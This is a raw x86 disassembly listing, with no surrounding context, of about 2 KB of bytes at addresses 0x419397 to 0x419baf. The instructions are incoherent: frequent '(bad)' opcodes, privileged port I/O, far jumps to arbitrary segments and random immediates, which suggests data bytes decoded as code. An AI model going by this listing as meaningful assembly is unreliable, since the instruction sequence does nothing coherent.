  419397:	adc    BYTE PTR ds:0x330bec03,dh
  41939d:	and    al,0x5f
  41939f:	das    
  4193a0:	dec    edi
  4193a1:	jecxz  0x419376
  4193a3:	aas    
  4193a4:	mov    edi,0x99879219
  4193a9:	inc    ebp
  4193aa:	xchg   edx,eax
  4193ab:	jo     0x4193b1
  4193ad:	mov    dh,0xc0
  4193af:	adc    cl,BYTE PTR cs:[edx-0x1055ca9]
  4193b6:	xor    ah,0x4b
  4193b9:	in     al,dx
  4193ba:	xor    al,0x42
  4193bc:	clc    
  4193bd:	test   BYTE PTR [eax],bh
  4193bf:	pop    ss
  4193c0:	cmp    ecx,DWORD PTR [ebx-0x63]
  4193c3:	inc    esp
  4193c4:	ficomp WORD PTR [eax+ecx*2+0x3179a742]
  4193cb:	fucomip st,st(6)
  4193cd:	daa    
  4193ce:	xor    eax,DWORD PTR [edx]
  4193d0:	add    DWORD PTR [esi],eax
  4193d2:	lods   al,BYTE PTR ds:[esi]
  4193d3:	cmp    DWORD PTR [edx+0x5fd12703],esp
  4193d9:	fist   DWORD PTR [edi]
  4193db:	(bad)  
  4193dc:	adc    DWORD PTR [eax],ebx
  4193de:	sbb    al,0xee
  4193e0:	jmp    0x9b35:0xe5628006
  4193e7:	iret   
  4193e8:	loope  0x419397
  4193ea:	dec    edi
  4193eb:	adc    eax,0xac8485fb
  4193f0:	ficom  WORD PTR [esi+edi*4]
  4193f3:	jge    0x41945f
  4193f5:	add    eax,0x2e80627c
  4193fa:	aaa    
  4193fb:	push   0xffffffa2
  4193fd:	adc    al,dh
  4193ff:	fld    TBYTE PTR [ebx]
  419401:	les    esi,FWORD PTR [ebx+0x4d]
  419404:	mov    edx,0x32d2ebda
  419409:	ins    DWORD PTR es:[edi],dx
  41940a:	mov    ah,0x91
  41940c:	cmp    dh,BYTE PTR [eax]
  41940e:	fsub   st(3),st
  419410:	cli    
  419411:	daa    
  419412:	or     dh,0x52
  419415:	cdq    
  419416:	xor    eax,0x74294aed
  41941b:	cmp    al,0x63
  41941d:	repnz ficom WORD PTR [ecx-0x1a]
  419421:	push   esi
  419422:	adc    eax,0x7e122689
  419427:	xor    dh,cl
  419429:	iret   
  41942a:	and    al,0x5c
  41942c:	imul   ecx,DWORD PTR [edx],0xffffffae
  41942f:	cs stos BYTE PTR es:[edi],al
  419431:	jnp    0x41948b
  419433:	das    
  419434:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  419436:	or     BYTE PTR [edx-0x4a6a4a9d],dl
  41943c:	mov    ch,0xc9
  41943e:	push   ds
  41943f:	jecxz  0x4193dc
  419441:	mov    cl,0x7f
  419443:	imul   ebx,DWORD PTR [edi-0x2a],0x6d
  419447:	inc    esi
  419448:	in     eax,dx
  419449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41944a:	mov    esp,0x9c0478b8
  41944f:	cmc    
  419450:	add    BYTE PTR [esi+ebp*1],0xf3
  419454:	mov    ah,0x7d
  419456:	in     al,0xbe
  419458:	aaa    
  419459:	nop
  41945a:	data16 fild WORD PTR [ebx-0x5407a894]
  419461:	mov    ah,0x93
  419463:	jg     0x419432
  419465:	sub    eax,0xb4db6d42
  41946a:	jo     0x419442
  41946c:	dec    ebp
  41946d:	(bad)  
  41946e:	mov    ecx,0x8a0150cb
  419473:	gs int 0xc2
  419476:	std    
  419477:	(bad)  
  419478:	pushf  
  419479:	scas   al,BYTE PTR es:[edi]
  41947a:	sub    ebx,DWORD PTR [ebp+ebx*2+0x1f0920a1]
  419481:	lods   eax,DWORD PTR ds:[esi]
  419482:	push   edx
  419483:	xchg   ecx,eax
  419484:	jmp    0xc0fe:0x6d1a62f1
  41948b:	xor    edi,ebx
  41948d:	mov    BYTE PTR [esi],dl
  41948f:	and    dh,BYTE PTR [ebx+0x33]
  419492:	pop    ds
  419493:	and    bh,dh
  419495:	or     ebp,DWORD PTR [ecx]
  419497:	push   cs
  419498:	repnz push eax
  41949a:	cmp    edx,edi
  41949c:	lods   eax,DWORD PTR ds:[esi]
  41949d:	cmp    esi,DWORD PTR [edx+0x12]
  4194a0:	or     al,0x49
  4194a2:	mov    BYTE PTR es:[edi],dh
  4194a5:	cmp    BYTE PTR [ebx],dl
  4194a7:	enter  0x4c9c,0x8f
  4194ab:	mov    al,ds:0x4a8ace23
  4194b0:	ror    cl,0xc5
  4194b3:	xchg   edx,eax
  4194b4:	cmp    DWORD PTR [ebx-0x1e],ebp
  4194b7:	mov    ch,0x4
  4194b9:	sub    BYTE PTR cs:[edx-0x69],0xb3
  4194be:	aaa    
  4194bf:	xchg   edx,eax
  4194c0:	jecxz  0x41948d
  4194c2:	popf   
  4194c3:	dec    esp
  4194c4:	inc    ecx
  4194c5:	mov    bl,0x26
  4194c7:	add    al,0xcb
  4194c9:	adc    DWORD PTR [ecx-0x5894d373],edi
  4194cf:	cs mov cl,0xcb
  4194d2:	test   al,0x37
  4194d4:	or     al,0xfc
  4194d6:	mov    WORD PTR [esp+edi*1-0x2cbe240a],ds
  4194dd:	cmp    bl,dh
  4194df:	and    eax,edi
  4194e1:	mov    eax,0xf67ed8d9
  4194e6:	fcomi  st,st(6)
  4194e8:	mov    fs,WORD PTR [ecx]
  4194ea:	mov    ecx,0xfa0236a9
  4194ef:	fnstsw WORD PTR ds:0xafb9497
  4194f5:	mov    eax,ds:0x9ab1b8de
  4194fa:	push   ss
  4194fb:	int3   
  4194fc:	xchg   edi,eax
  4194fd:	mov    bl,0xb
  4194ff:	push   cs
  419500:	(bad)  
  419501:	jbe    0x419534
  419503:	cs push ss
  419505:	fist   WORD PTR [ecx-0x3e]
  419508:	rcr    DWORD PTR [ebx],0x5c
  41950b:	mov    DWORD PTR ds:0x69f81cca,ecx
  419511:	jmp    0x419545
  419513:	sbb    ch,dh
  419515:	mov    WORD PTR [ecx-0x4fee68a5],ss
  41951b:	test   eax,0xfb6e03c5
  419520:	aas    
  419521:	xchg   edx,eax
  419522:	leave  
  419523:	fidiv  DWORD PTR [ebx+0x7ce06757]
  419529:	cli    
  41952a:	jp     0x4195a5
  41952c:	xchg   BYTE PTR [edi+0x1cfd44d6],ah
  419532:	inc    BYTE PTR [ebx+0x2647ae]
  419538:	dec    eax
  419539:	pop    ebx
  41953a:	neg    BYTE PTR [esi+0x9]
  41953d:	jle    0x41956d
  41953f:	fcomp  QWORD PTR [ebp+0x1c]
  419542:	cmp    eax,0xc2a43d31
  419547:	pop    ds
  419548:	imul   ebp,edi,0xf86e307a
  41954e:	jmp    0x41952d
  419550:	mov    edx,0xfde3b641
  419555:	jp     0x419524
  419557:	in     eax,dx
  419558:	cmp    edi,eax
  41955a:	mov    edx,0x9f69321b
  41955f:	xchg   ebx,eax
  419560:	xor    cl,BYTE PTR [esi+0x10]
  419563:	test   eax,0xf2ffa5a0
  419568:	mov    ebp,DWORD PTR [edi+0x4c]
  41956b:	test   DWORD PTR [eax],ebp
  41956d:	and    edx,DWORD PTR [ebx+0x2a8d304b]
  419573:	jmp    0x59:0x50d36bd5
  41957a:	(bad)  [ebp+0x33bc74e2]
  419580:	je     0x41952e
  419582:	jmp    0xdef3:0x64a4454d
  419589:	jns    0x4195dc
  41958b:	ins    BYTE PTR es:[edi],dx
  41958c:	adc    al,0x48
  41958e:	jg     0x419563
  419590:	lods   al,BYTE PTR es:[esi]
  419592:	push   ds
  419593:	mov    ch,0xdb
  419595:	stos   DWORD PTR es:[edi],eax
  419596:	mov    edx,0xf3f87c7d
  41959b:	test   esp,ebp
  41959d:	loope  0x41955d
  41959f:	in     al,dx
  4195a0:	(bad)  
  4195a1:	int3   
  4195a2:	(bad)  
  4195a3:	in     eax,0x80
  4195a5:	dec    eax
  4195a6:	mov    edi,0xafa43abe
  4195ab:	pusha  
  4195ac:	inc    eax
  4195ad:	inc    esi
  4195ae:	xor    al,0xd3
  4195b0:	bound  ebp,QWORD PTR [ebp+edi*8-0x2]
  4195b4:	cmc    
  4195b5:	push   ecx
  4195b6:	das    
  4195b7:	inc    ebp
  4195b8:	mov    edi,0xf4b9ada6
  4195bd:	add    BYTE PTR [esi],0x2d
  4195c0:	fbstp  TBYTE PTR [ecx]
  4195c2:	dec    edi
  4195c3:	daa    
  4195c4:	dec    eax
  4195c5:	cld    
  4195c6:	leave  
  4195c7:	pop    ds
  4195c8:	mov    ds:0x45c37bc8,al
  4195cd:	jecxz  0x41963a
  4195cf:	mov    WORD PTR [ebx+0x37],ss
  4195d2:	cli    
  4195d3:	call   0x6145:0xd115f52a
  4195da:	inc    edx
  4195db:	fdiv   DWORD PTR [esi+0x39009aff]
  4195e1:	or     al,0xe8
  4195e3:	sbb    cl,BYTE PTR [esi]
  4195e5:	popf   
  4195e6:	xchg   ecx,eax
  4195e7:	xor    BYTE PTR [edi],ch
  4195e9:	xchg   edx,ebx
  4195eb:	adc    ah,cl
  4195ed:	loope  0x41963e
  4195ef:	mov    ecx,0xc9d4d0fc
  4195f4:	std    
  4195f5:	xor    eax,0x8acc053
  4195fa:	mov    al,ds:0xaaaf16
  4195ff:	and    ebp,ecx
  419601:	fdiv   QWORD PTR [edx-0x1e]
  419604:	or     al,0xe
  419606:	sti    
  419607:	cmp    bl,dh
  419609:	nop
  41960a:	mov    di,0x53bf
  41960e:	aas    
  41960f:	inc    eax
  419610:	jae    0x419623
  419612:	mov    DWORD PTR [esi+ebp*1+0x3bb9323c],0x6fd1b809
  41961d:	mov    ah,0x75
  41961f:	leave  
  419620:	dec    eax
  419621:	rol    DWORD PTR [ecx+ecx*8+0x16a0aea0],cl
  419628:	in     eax,0x78
  41962a:	loope  0x419698
  41962c:	mov    dh,0x7d
  41962e:	mov    ds:0x9be6a277,al
  419633:	(bad)  
  419634:	pushw  ds
  419636:	or     al,0x72
  419638:	inc    BYTE PTR [ebx]
  41963a:	adc    BYTE PTR [edx],bh
  41963c:	dec    edx
  41963d:	sahf   
  41963e:	pop    esp
  41963f:	sbb    eax,0xfb054876
  419644:	or     ebx,DWORD PTR [ecx]
  419646:	dec    esi
  419647:	sub    DWORD PTR [ebx-0x4b],esp
  41964a:	cs cmp al,0x18
  41964d:	mov    cl,0xb6
  41964f:	out    dx,eax
  419650:	fsubr  DWORD PTR [eax+0x4a8820c8]
  419656:	repz not ebx
  419659:	mov    ch,0xba
  41965b:	sbb    al,0xf7
  41965d:	xchg   esp,eax
  41965e:	inc    ecx
  41965f:	cmp    dh,bl
  419661:	int    0xf
  419663:	pop    ss
  419664:	ja     0x4196aa
  419666:	js     0x4196cb
  419668:	mov    ebp,0x14644525
  41966d:	cmp    BYTE PTR ss:[esi-0x2ebcbd6c],bh
  419674:	pusha  
  419675:	xchg   BYTE PTR [ebx-0x745c95f1],ah
  41967b:	mov    esi,DWORD PTR [ebx-0x33]
  41967e:	rcl    edx,1
  419680:	out    dx,eax
  419681:	add    DWORD PTR [edx],ebp
  419683:	push   ebp
  419684:	cmp    eax,0x509d5903
  419689:	xchg   edi,eax
  41968a:	iret   
  41968b:	mov    bl,0x4a
  41968d:	test   eax,0xe03dec6e
  419692:	mov    ecx,0x581706fd
  419697:	retf   
  419698:	aas    
  419699:	sbb    al,0x56
  41969b:	push   esi
  41969c:	dec    ebx
  41969d:	push   esi
  41969e:	les    eax,FWORD PTR [edi-0x69003afc]
  4196a4:	(bad)  
  4196a5:	stc    
  4196a6:	push   0xffffffbc
  4196a8:	pop    eax
  4196a9:	jmp    FWORD PTR [ebp-0x1e7c87b7]
  4196af:	mov    esp,0xf8ca2be9
  4196b4:	in     al,0x74
  4196b6:	mov    ch,0x3b
  4196b8:	pop    ds
  4196b9:	jp     0x4196fd
  4196bb:	push   es
  4196bc:	in     eax,dx
  4196bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196be:	loope  0x419666
  4196c0:	test   eax,0x4ab71d4c
  4196c5:	xchg   edi,eax
  4196c6:	call   0x33ea:0xb9393cf5
  4196cd:	test   al,0x88
  4196cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196d0:	mov    edx,DWORD PTR [edx-0xb]
  4196d3:	cmp    esp,DWORD PTR [ebp+0x49]
  4196d6:	cmp    eax,0x2a1d0a2e
  4196db:	cmp    BYTE PTR [esi-0x78],cl
  4196de:	mov    ds:0x3445acb7,eax
  4196e3:	iret   
  4196e4:	bound  edi,QWORD PTR [esi-0x3d]
  4196e7:	and    DWORD PTR [edi],0xfffffff4
  4196ea:	sar    BYTE PTR [ebp+eiz*4+0x23a0add],cl
  4196f1:	mov    edx,0xc064b312
  4196f6:	cmp    DWORD PTR [edi+eiz*1-0x22e299c6],edi
  4196fd:	jmp    0x4196ae
  4196ff:	sub    al,0x1d
  419701:	or     eax,0xf6e1fd51
  419706:	repz dec esi
  419708:	and    eax,0x719fb7f0
  41970d:	dec    edx
  41970e:	dec    ecx
  41970f:	mov    edi,0xf0b889a5
  419714:	lock mov fs,WORD PTR [ecx]
  419717:	loopne 0x4196a8
  419719:	sub    DWORD PTR [ecx-0x54],ebp
  41971c:	fiadd  WORD PTR [eax]
  41971e:	sbb    al,0x61
  419720:	and    BYTE PTR [edi+0x48],dl
  419723:	nop
  419724:	pop    ss
  419725:	inc    esp
  419726:	mov    bl,0xe2
  419728:	(bad)  
  419729:	pusha  
  41972a:	pop    ds
  41972b:	or     ecx,0x61338ea8
  419731:	or     DWORD PTR [esi-0x25454e52],esi
  419737:	sbb    eax,0xa0a5d03e
  41973c:	ror    BYTE PTR [eax-0x20],cl
  41973f:	jo     0x419726
  419741:	jae    0x4196f3
  419743:	push   cs
  419744:	xchg   esp,eax
  419745:	imul   esi,DWORD PTR [edi+0x2a926cd0],0xffffff85
  41974c:	loopne 0x419710
  41974e:	jl     0x4197a5
  419750:	js     0x4196e8
  419752:	dec    edx
  419753:	imul   ecx,DWORD PTR [ecx-0x11],0xad9238d9
  41975a:	and    ebp,DWORD PTR [ebx+ebx*8-0x2e9164f1]
  419761:	fwait
  419762:	dec    ebp
  419763:	pop    es
  419764:	je     0x4197c0
  419766:	adc    ecx,DWORD PTR [esp+esi*1-0x51592216]
  41976d:	xor    DWORD PTR [ebx],esp
  41976f:	inc    ebx
  419770:	pusha  
  419771:	sbb    al,0xc3
  419773:	std    
  419774:	mov    dl,0xca
  419776:	das    
  419777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419778:	push   0x9
  41977a:	cdq    
  41977b:	clc    
  41977c:	fld    TBYTE PTR [ecx+0x5f390557]
  419782:	fld    QWORD PTR [ecx+0x66c7850e]
  419788:	add    BYTE PTR [ecx+eiz*8],ah
  41978b:	xor    bl,bl
  41978d:	add    DWORD PTR [edi+0x121fa205],eax
  419793:	push   0x9fa8acb6
  419798:	xchg   edi,eax
  419799:	push   esp
  41979a:	sahf   
  41979b:	pushf  
  41979c:	icebp  
  41979d:	sub    edx,DWORD PTR [esi-0x2b90538]
  4197a3:	push   edi
  4197a4:	stos   BYTE PTR es:[edi],al
  4197a5:	(bad)  
  4197a6:	fisubr WORD PTR [edi]
  4197a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197a9:	pop    ds
  4197aa:	mov    ecx,0xdebf5492
  4197af:	out    0xd5,al
  4197b1:	sub    DWORD PTR [ebp-0x1e],edi
  4197b4:	cmp    ch,BYTE PTR [esi]
  4197b6:	ins    DWORD PTR es:[edi],dx
  4197b7:	cs cdq 
  4197b9:	push   0xffffffe5
  4197bb:	inc    ebx
  4197bc:	enter  0xfbdd,0x58
  4197c0:	push   eax
  4197c1:	push   ecx
  4197c2:	mov    bl,0xbc
  4197c4:	push   0xffffffcd
  4197c6:	ss push eax
  4197c8:	div    bl
  4197ca:	push   esp
  4197cb:	push   es
  4197cc:	ins    DWORD PTR es:[edi],dx
  4197cd:	or     eax,DWORD PTR [eax]
  4197cf:	shl    DWORD PTR ds:0xfb74a636,1
  4197d5:	or     BYTE PTR [esi+0x22],ah
  4197d8:	popf   
  4197d9:	sbb    eax,0x94e248f1
  4197de:	lds    ebx,FWORD PTR ds:0x66a9f0f6
  4197e4:	call   0x1a16efdb
  4197e9:	in     eax,0xad
  4197eb:	popf   
  4197ec:	jo     0x4197ae
  4197ee:	out    dx,al
  4197ef:	cmp    esp,ecx
  4197f1:	neg    bl
  4197f3:	neg    DWORD PTR ds:0xa8e4cd60
  4197f9:	aaa    
  4197fa:	stc    
  4197fb:	ins    BYTE PTR es:[edi],dx
  4197fc:	(bad)  
  4197fd:	cli    
  4197fe:	sbb    al,0x91
  419800:	jbe    0x4197f0
  419802:	out    0xcb,eax
  419804:	jb     0x41983e
  419806:	jl     0x419855
  419808:	ret    0x91b
  41980b:	mov    ebp,0xe71ff268
  419810:	gs (bad) 
  419812:	les    esi,FWORD PTR [esi]
  419814:	and    BYTE PTR [eax-0x16c3a0f3],ah
  41981a:	push   edx
  41981b:	out    dx,al
  41981c:	(bad)  [edx+esi*4]
  41981f:	shl    BYTE PTR [ecx-0x7],1
  419822:	or     bl,dl
  419824:	adc    bl,BYTE PTR [edx-0x77]
  419827:	es ins BYTE PTR es:[edi],dx
  419829:	jo     0x41981f
  41982b:	and    esi,DWORD PTR [ebx+esi*4]
  41982e:	clc    
  41982f:	mov    ecx,0xfd5e8b04
  419834:	fs stos DWORD PTR es:[edi],eax
  419836:	adc    eax,0xb3dce5bd
  41983b:	mov    al,0x42
  41983d:	imul   edi,DWORD PTR [ebp-0x70],0xb50b46db
  419844:	cmp    edi,DWORD PTR [ebx+ebx*1-0x4c444189]
  41984b:	daa    
  41984c:	jecxz  0x4198a4
  41984e:	call   0x2313f6b4
  419853:	push   ebx
  419854:	inc    edi
  419855:	ss (bad) 
  419857:	sahf   
  419858:	add    dh,BYTE PTR [edx+ecx*2+0x6b]
  41985c:	mov    ebx,0x47fce665
  419861:	pop    ecx
  419862:	stos   DWORD PTR es:[edi],eax
  419863:	push   ecx
  419864:	cld    
  419865:	lds    ebx,FWORD PTR [ebx]
  419867:	(bad)  
  419868:	adc    bh,BYTE PTR [eax+0x71]
  41986b:	mov    ecx,0x53ba6815
  419870:	fwait
  419871:	cmc    
  419872:	adc    DWORD PTR [esi+0x6e],ebx
  419875:	loop   0x4198f1
  419877:	adc    al,0xe2
  419879:	out    dx,al
  41987a:	sbb    BYTE PTR [ebx+edx*2+0x756c43bf],al
  419881:	dec    edx
  419882:	cmp    DWORD PTR [ecx-0x21],ebp
  419885:	sbb    edx,edx
  419887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419888:	mov    ds:0x713b8b66,al
  41988d:	or     bh,BYTE PTR [ebp-0x57]
  419890:	mov    ah,0x7f
  419892:	push   eax
  419893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419894:	cmp    bh,ch
  419896:	jp     0x419839
  419898:	fadd   st(2),st
  41989a:	and    ebp,DWORD PTR ds:0x7a5be767
  4198a0:	lods   al,BYTE PTR es:[esi]
  4198a2:	push   ss
  4198a3:	inc    edx
  4198a4:	gs sub edi,edi
  4198a7:	push   ss
  4198a8:	mov    ch,0x1a
  4198aa:	add    eax,0x7f4934f8
  4198af:	and    BYTE PTR [esi+ebp*8-0x31010df8],cl
  4198b6:	adc    al,0x6
  4198b8:	jl     0x4198c0
  4198ba:	xor    DWORD PTR [edi-0xf32f11],edx
  4198c0:	dec    ecx
  4198c1:	push   esp
  4198c2:	imul   ebx,DWORD PTR [ebp-0x79661c56],0xe66f3b40
  4198cc:	addr16 data16 mov bl,0xd5
  4198d0:	or     eax,0x4be80de9
  4198d5:	std    
  4198d6:	ins    BYTE PTR es:[edi],dx
  4198d7:	sub    eax,0xd7716659
  4198dc:	jp     0x419926
  4198de:	jb     0x419870
  4198e0:	push   edx
  4198e1:	jmp    0x343:0x6e53
  4198e7:	fsubr  QWORD PTR [edx-0x6a4bcacc]
  4198ed:	inc    esi
  4198ee:	sbb    eax,0x712202fc
  4198f3:	fistp  QWORD PTR [eax+0x5ec7a00]
  4198f9:	mov    ch,0xce
  4198fb:	aaa    
  4198fc:	add    eax,0xb0c7fef2
  419901:	sar    BYTE PTR [edx+0x5851518c],1
  419907:	jmp    0x4198b8
  419909:	stos   BYTE PTR es:[edi],al
  41990a:	fldcw  WORD PTR [edx+ebp*8+0x467ee756]
  419911:	out    0x6,eax
  419913:	dec    ebx
  419914:	repnz add dl,BYTE PTR [eax]
  419917:	cwde   
  419918:	pop    ebx
  419919:	cmp    ebx,DWORD PTR [edi+eax*2]
  41991c:	push   edx
  41991d:	cmp    ah,al
  41991f:	jbe    0x419986
  419921:	fsubr  st(2),st
  419923:	in     eax,dx
  419924:	cld    
  419925:	bound  edx,QWORD PTR [esi+0x60]
  419928:	xchg   DWORD PTR [ecx],ecx
  41992a:	pop    esi
  41992b:	add    dl,cl
  41992d:	lock lea esi,[edx]
  419930:	into   
  419931:	(bad)  
  419932:	pop    ebp
  419933:	(bad)
  419936:	mov    al,BYTE PTR [eax-0x1346024]
  41993c:	jge    0x4199bb
  41993e:	xor    ebx,DWORD PTR [ebx+0x128477d9]
  419944:	fdivr  st(2),st
  419946:	mov    ecx,0x355598c1
  41994b:	cmp    eax,0xa02da737
  419950:	and    DWORD PTR [edi+edx*4+0x14fa2d9f],ebp
  419957:	or     BYTE PTR [esi-0x23],ah
  41995a:	lahf   
  41995b:	ss xchg ebx,eax
  41995d:	stc    
  41995e:	and    BYTE PTR [ebx-0x64],0xb4
  419962:	push   ebx
  419963:	fs inc esp
  419965:	mov    al,ds:0xe15e09c0
  41996a:	mov    esi,0x51c012be
  41996f:	and    eax,0x8a94df94
  419974:	(bad)  
  419975:	mov    dh,0x6b
  419977:	push   DWORD PTR [edx-0x5]
  41997a:	repnz in eax,dx
  41997c:	daa    
  41997d:	inc    ecx
  41997e:	sub    DWORD PTR [ebx+0x5391924f],0x56
  419985:	int    0x7f
  419987:	std    
  419988:	jge    0x419970
  41998a:	jp     0x41997d
  41998c:	push   ss
  41998d:	and    eax,0x78665806
  419992:	xchg   ebx,eax
  419993:	xor    BYTE PTR [eax],cl
  419995:	(bad)  
  419996:	fs sub al,0xde
  419999:	add    bl,BYTE PTR [ebx-0x15]
  41999c:	cmp    DWORD PTR [esi+0x39739dc0],ecx
  4199a2:	push   ds
  4199a3:	sbb    eax,DWORD PTR ds:0xe6aa4f82
  4199a9:	mov    edi,0x95456e00
  4199ae:	xchg   BYTE PTR [edx+0x31],ch
  4199b1:	adc    ebx,DWORD PTR [eax]
  4199b3:	(bad)  
  4199b4:	push   ecx
  4199b5:	pop    edx
  4199b6:	or     dh,BYTE PTR [ebx+0x6f]
  4199b9:	push   ecx
  4199ba:	lea    ebx,[eax+edi*8-0x42e4efd7]
  4199c1:	xor    al,0xd1
  4199c3:	jo     0x41998b
  4199c5:	js     0x419967
  4199c7:	pop    ecx
  4199c8:	add    al,0x7
  4199ca:	xor    BYTE PTR [edi-0x38ec32ea],bl
  4199d0:	rcr    BYTE PTR [edi+0x46],0xd6
  4199d4:	(bad)  
  4199d5:	rcl    DWORD PTR [edx+0x75],cl
  4199d8:	mov    WORD PTR [ebx],?
  4199da:	mov    esi,0x43f459d0
  4199df:	shr    DWORD PTR [edx],1
  4199e1:	sbb    dl,bh
  4199e3:	pop    ebx
  4199e4:	jbe    0x419a08
  4199e6:	fmul   st,st(0)
  4199e8:	or     esi,DWORD PTR [eax]
  4199ea:	scas   al,BYTE PTR es:[edi]
  4199eb:	jmp    0xc2ba3bd
  4199f0:	xor    eax,0x68146c45
  4199f5:	add    ah,BYTE PTR [edi+ebx*2-0x22e4ef5c]
  4199fc:	sub    BYTE PTR [ebx-0x4f93043b],0x7
  419a03:	jp     0x419a6f
  419a05:	loopne 0x419a30
  419a07:	out    dx,al
  419a08:	arpl   WORD PTR [edi-0x6ba040c2],cx
  419a0e:	mov    ah,0x8
  419a10:	dec    ebx
  419a11:	and    eax,0xbc71a282
  419a16:	xchg   esp,eax
  419a17:	inc    edx
  419a18:	sub    ebp,eax
  419a1a:	test   DWORD PTR [ebx+0x4a92e81c],ebx
  419a20:	sub    bl,dl
  419a22:	mov    ds:0xb52a80a7,eax
  419a27:	lods   eax,DWORD PTR ds:[esi]
  419a28:	xor    edi,DWORD PTR [ebp-0x1087bba6]
  419a2e:	jbe    0x4199fa
  419a30:	stos   BYTE PTR es:[edi],al
  419a31:	imul   ebx,eax,0x3f
  419a34:	in     al,dx
  419a35:	mov    bl,0xf6
  419a37:	or     DWORD PTR [edx-0x67],ebx
  419a3a:	fldcw  WORD PTR [ecx-0x23]
  419a3d:	out    0x51,eax
  419a3f:	popf   
  419a40:	in     eax,0xed
  419a42:	test   eax,0x87cc9ee
  419a47:	(bad)  
  419a48:	inc    edi
  419a49:	add    edx,DWORD PTR [eax-0x7d]
  419a4c:	in     eax,0x54
  419a4e:	adc    ch,BYTE PTR [ebp-0x218ce607]
  419a54:	test   al,0x7f
  419a56:	enter  0xd2af,0x23
  419a5a:	mov    cl,0x81
  419a5c:	jae    0x419a0f
  419a5e:	add    cl,bh
  419a60:	lods   eax,DWORD PTR ds:[esi]
  419a61:	push   edi
  419a62:	xor    bl,cl
  419a64:	jp     0x419a73
  419a66:	lds    ebx,FWORD PTR [esi-0x68]
  419a69:	inc    esi
  419a6a:	mov    ch,0x33
  419a6c:	push   ecx
  419a6d:	sub    al,0x1f
  419a6f:	and    ebp,DWORD PTR [ecx+0x76]
  419a72:	and    eax,0xc046942c
  419a77:	test   BYTE PTR [edx],ah
  419a79:	mov    dl,0xe5
  419a7b:	(bad)
  419a7e:	loopne 0x419a74
  419a80:	idiv   BYTE PTR [ebx-0x72]
  419a83:	fwait
  419a84:	out    dx,al
  419a85:	data16 aas 
  419a87:	leave  
  419a88:	shl    DWORD PTR [ebp-0x21],cl
  419a8b:	jecxz  0x419a23
  419a8d:	dec    esp
  419a8e:	mov    BYTE PTR [ebx+0x16e101c8],ch
  419a94:	mov    ebp,DWORD PTR [eax]
  419a96:	lea    ebx,[edi]
  419a98:	push   esi
  419a99:	jmp    0x26d153ff
  419a9e:	jno    0x419aaf
  419aa0:	mov    ds:0x3832e058,al
  419aa5:	and    BYTE PTR [eax],dl
  419aa7:	out    dx,eax
  419aa8:	cmc    
  419aa9:	or     al,0x16
  419aab:	jp     0x419a33
  419aad:	xchg   sp,ax
  419aaf:	add    BYTE PTR [ebx+ecx*4-0x626b0037],ch
  419ab6:	cld    
  419ab7:	ret    
  419ab8:	iret   
  419ab9:	pop    ebx
  419aba:	dec    dh
  419abc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419abd:	out    0xbb,eax
  419abf:	pop    ebx
  419ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ac1:	sbb    DWORD PTR [ebx],edx
  419ac3:	arpl   WORD PTR [edi+0x35],ax
  419ac6:	std    
  419ac7:	mov    dh,0x1c
  419ac9:	sbb    DWORD PTR [edi-0x4435788b],0x1b
  419ad0:	call   0x2a47a9bb
  419ad5:	pop    edi
  419ad6:	cs dec ebx
  419ad8:	pop    esp
  419ad9:	jmp    0xf1190cce
  419ade:	inc    esp
  419adf:	add    eax,0xff7810f8
  419ae4:	lods   al,BYTE PTR ds:[esi]
  419ae5:	and    BYTE PTR [ecx-0x4f],al
  419ae8:	adc    edx,DWORD PTR [edi-0xa85363f]
  419aee:	mov    WORD PTR [esi],es
  419af0:	jnp    0x419b0b
  419af2:	mov    bh,0xb9
  419af4:	xor    eax,0x9bc98e2e
  419af9:	sub    bh,BYTE PTR [edi-0x646b4513]
  419aff:	mov    dl,0xc0
  419b01:	pop    esp
  419b02:	mov    ecx,DWORD PTR [ebx+0x7f8caf48]
  419b08:	test   al,0x29
  419b0a:	dec    esp
  419b0b:	inc    edi
  419b0c:	fld    QWORD PTR [ebx+edx*4-0x158477e8]
  419b13:	jno    0x419acb
  419b15:	xor    DWORD PTR [edx-0x340a5fb3],eax
  419b1b:	add    eax,0x97210d
  419b21:	test   ebx,ebp
  419b23:	mov    ebx,0xed1a0181
  419b28:	add    eax,0xdf9f29d
  419b2d:	gs inc ebx
  419b2f:	(bad)  
  419b30:	sbb    eax,0x2cfc9baa
  419b35:	sub    DWORD PTR [eax],ebx
  419b37:	fnsave [eax+0x4136b4d6]
  419b3d:	mov    edi,0xbdebfc72
  419b42:	addr16 push 0xc679972e
  419b48:	dec    eax
  419b49:	inc    eax
  419b4a:	cs jp  0x419b81
  419b4d:	mov    ebp,0x776ef239
  419b52:	test   eax,0x1dcf4222
  419b57:	inc    DWORD PTR ds:0xe381b866
  419b5d:	jmp    0x504c:0x7201b52a
  419b64:	jmp    0x8fc7:0xb29fd58e
  419b6b:	sbb    BYTE PTR [esi-0x5e838340],0x33
  419b72:	outs   dx,BYTE PTR ds:[esi]
  419b73:	scas   al,BYTE PTR es:[edi]
  419b74:	outs   dx,BYTE PTR ds:[esi]
  419b75:	stc    
  419b76:	jb     0x419b63
  419b78:	dec    ecx
  419b79:	retf   0xe35b
  419b7c:	repz pushf 
  419b7e:	fs xor eax,0xe88d0514
  419b84:	dec    edx
  419b85:	cmp    DWORD PTR [edx+0x43fc99d4],ebx
  419b8b:	inc    esp
  419b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b8d:	inc    eax
  419b8e:	(bad)  
  419b8f:	rcr    BYTE PTR ds:0x8350c162,0xae
  419b96:	pop    edi
  419b97:	and    DWORD PTR [edi],eax
  419b99:	pop    edx
  419b9a:	mov    dh,0x68
  419b9c:	xchg   ebx,eax
  419b9d:	sbb    bh,bl
  419b9f:	cld    
  419ba0:	lock adc al,0x47
  419ba3:	jnp    0x419b53
  419ba5:	test   al,0xd6
  419ba7:	mov    ?,WORD PTR [ecx+0x8]
  419baa:	sbb    eax,0xacd8d470
  419baf:	mov    ah,dh
